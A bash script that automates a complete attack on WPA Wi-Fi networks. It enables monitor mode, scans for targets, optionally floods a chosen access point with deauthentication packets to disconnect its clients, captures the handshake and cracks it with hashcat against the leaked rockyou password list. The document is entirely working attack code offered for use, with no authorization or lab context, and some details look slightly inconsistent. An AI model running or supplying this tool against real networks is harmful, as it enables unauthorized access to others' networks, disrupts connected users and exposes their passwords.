#!/bin/bash
# =============================================================================
# WPA Handshake Capture & Crack Script
# =============================================================================
# This script automates the WPA handshake capture process using aircrack-ng
# and cracks it using hashcat.
#
# REQUIREMENTS:
# - aircrack-ng suite (airmon-ng, aireplay-ng, airodump-ng)
# - hashcat
# - A compatible WiFi adapter that supports monitor mode
# - Root/sudo privileges
#
# USAGE:
#   sudo ./scripts/wpa_handshake.sh [OPTIONS]
#
# OPTIONS:
#   -i, --interface IFACE    WiFi interface (default: wlan0)
#   -w, --wordlist FILE      Path to wordlist (default: wordlists/rockyou.txt)
#   -t, --target BSSID       Target BSSID (MAC address)
#   -c, --channel CHANNEL    Target channel
#   -d, --deauth             Send deauthentication packets
#   -o, --output FILE        Output capture file
#   -h, --help               Show this help message
#
# =============================================================================

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Default values
INTERFACE="wlan0"
WORDLIST="wordlists/rockyou.txt"
TARGET_BSSID=""
TARGET_CHANNEL=""
OUTPUT_FILE=""
SEND_DEAUTH=false

# Functions
print_banner() {
    echo -e "${CYAN}${NC}"
    echo -e "${CYAN}╔═══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║         WPA Handshake Capture & Crack Script                 ║${NC}"
    echo -e "${CYAN}║                     v1.0                                     ║${NC}"
    echo -e "${CYAN}╚═══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

print_usage() {
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Options:"
    echo "  -i, --interface IFACE    WiFi interface (default: wlan0)"
    echo "  -w, --wordlist FILE      Path to wordlist (default: wordlists/rockyou.txt)"
    echo "  -t, --target BSSID       Target BSSID (MAC address)"
    echo "  -c, --channel CHANNEL    Target channel"
    echo "  -d, --deauth             Send deauthentication packets"
    echo "  -o, --output FILE        Output capture file"
    echo "  -h, --help               Show this help message"
}

check_root() {
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[!] This script must be run as root (use sudo)${NC}"
        exit 1
    fi
}

check_dependencies() {
    echo -e "${BLUE}[*] Checking dependencies...${NC}"
    
    local deps=("airmon-ng" "aireplay-ng" "airodump-ng" "hashcat")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${RED}[!] Missing dependencies:${NC}"
        for dep in "${missing[@]}"; do
            echo "    - $dep"
        done
        echo ""
        echo -e "${YELLOW}[*] Install with: sudo apt-get install aircrack-ng hashcat${NC}"
        exit 1
    fi
    
    echo -e "${GREEN}[✓] All dependencies found${NC}"
}

check_wordlist() {
    if [[ ! -f "$WORDLIST" ]]; then
        echo -e "${RED}[!] Wordlist not found: $WORDLIST${NC}"
        echo -e "${YELLOW}[*] Download a wordlist:${NC}"
        echo "    - wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz"
        echo "    - tar -xzf rockyou.txt.tar.gz"
        echo "    - mv rockyou.txt wordlists/"
        return 1
    fi
    return 0
}

enable_monitor_mode() {
    echo -e "${BLUE}[*] Enabling monitor mode on $INTERFACE...${NC}"
    
    # Kill any interfering processes
    airmon-ng check kill 2>/dev/null || true
    
    # Enable monitor mode
    airmon-ng start "$INTERFACE"
    
    # Detect monitor interface
    MONITOR_IF=$(iw dev | grep -A 1 "$INTERFACE" | grep Interface | awk '{print $2}')
    
    if [[ -z "$MONITOR_IF" ]]; then
        MONITOR_IF="${INTERFACE}mon"
    fi
    
    echo -e "${GREEN}[✓] Monitor mode enabled on $MONITOR_IF${NC}"
}

scan_networks() {
    echo -e "${BLUE}[*] Scanning for networks (5 seconds)...${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to stop scanning${NC}"
    echo ""
    
    timeout 10 airodump-ng "$MONITOR_IF" 2>/dev/null || true
    
    echo ""
    echo -e "${CYAN}[*] Note down the BSSID and Channel of your target${NC}"
    echo -e "${CYAN}[*] Run this script again with -t <BSSID> -c <CHANNEL>${NC}"
}

capture_handshake() {
    echo -e "${BLUE}[*] Capturing WPA handshake from $TARGET_BSSID...${NC}"
    echo -e "${YELLOW}[*] This may take a while. Make sure clients are connected.${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C when you see 'WPA handshake' in the top right${NC}"
    echo ""
    
    # Set channel
    iwconfig "$MONITOR_IF" channel "$TARGET_CHANNEL" 2>/dev/null
    
    # Create captures directory if it doesn't exist
    mkdir -p captures
    
    # Generate output filename
    if [[ -z "$OUTPUT_FILE" ]]; then
        TIMESTAMP=$(date +%Y%m%d_%H%M%S)
        OUTPUT_FILE="captures/handshake_${TARGET_BSSID//:/}_${TIMESTAMP}.cap"
    fi
    
    # Start capture
    airodump-ng -c "$TARGET_CHANNEL" \
                --bssid "$TARGET_BSSID" \
                -w "$OUTPUT_FILE" \
                "$MONITOR_IF"
    
    if [[ -f "$OUTPUT_FILE" ]]; then
        echo -e "${GREEN}[✓] Handshake captured: $OUTPUT_FILE${NC}"
    else
        echo -e "${RED}[!] Failed to capture handshake${NC}"
        return 1
    fi
}

send_deauth() {
    echo -e "${BLUE}[*] Sending deauthentication packets...${NC}"
    
    # Send 5 deauth packets
    aireplay-ng -0 5 -a "$TARGET_BSSID" "$MONITOR_IF"
    
    echo -e "${GREEN}[✓] Deauth packets sent${NC}"
}

crack_handshake() {
    echo -e "${BLUE}[*] Cracking handshake with Hashcat...${NC}"
    echo -e "${CYAN}[*] Capture: $OUTPUT_FILE${NC}"
    echo -e "${CYAN}[*] Wordlist: $WORDLIST${NC}"
    echo ""
    
    # Convert cap to hc22000 format
    HCCAPX_FILE="${OUTPUT_FILE%.cap}.hc22000"
    
    if command -v cap2hc22000 &> /dev/null; then
        cap2hc22000 "$OUTPUT_FILE" > "$HCCAPX_FILE"
    else
        echo -e "${YELLOW}[!] cap2hc22000 not found, trying hashcat directly...${NC}"
        HCCAPX_FILE="$OUTPUT_FILE"
    fi
    
    # Crack with hashcat
    echo -e "${YELLOW}[*] Starting hashcat (this may take a long time)...${NC}"
    hashcat -m 22000 -a 0 "$HCCAPX_FILE" "$WORDLIST" --force
    
    # Show results
    echo ""
    echo -e "${GREEN}[✓] Cracking complete!${NC}"
    echo -e "${CYAN}[*] Check hashcat output above for the password${NC}"
}

disable_monitor_mode() {
    echo -e "${BLUE}[*] Disabling monitor mode...${NC}"
    airmon-ng stop "$MONITOR_IF" 2>/dev/null || true
    echo -e "${GREEN}[✓] Monitor mode disabled${NC}"
}

cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Cleaning up...${NC}"
    disable_monitor_mode
    echo -e "${GREEN}[✓] Done${NC}"
}

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -i|--interface)
            INTERFACE="$2"
            shift 2
            ;;
        -w|--wordlist)
            WORDLIST="$2"
            shift 2
            ;;
        -t|--target)
            TARGET_BSSID="$2"
            shift 2
            ;;
        -c|--channel)
            TARGET_CHANNEL="$2"
            shift 2
            ;;
        -d|--deauth)
            SEND_DEAUTH=true
            shift
            ;;
        -o|--output)
            OUTPUT_FILE="$2"
            shift 2
            ;;
        -h|--help)
            print_usage
            exit 0
            ;;
        *)
            echo -e "${RED}[!] Unknown option: $1${NC}"
            print_usage
            exit 1
            ;;
    esac
done

# Main execution
print_banner
check_root
check_dependencies

# Set trap for cleanup
trap cleanup EXIT

if [[ -z "$TARGET_BSSID" ]]; then
    # No target specified, scan for networks
    enable_monitor_mode
    scan_networks
else
    # Target specified, capture and crack
    if [[ -z "$TARGET_CHANNEL" ]]; then
        echo -e "${RED}[!] Channel is required when specifying target${NC}"
        exit 1
    fi
    
    check_wordlist || exit 1
    
    enable_monitor_mode
    
    if $SEND_DEAUTH; then
        send_deauth
    fi
    
    capture_handshake
    crack_handshake
fi
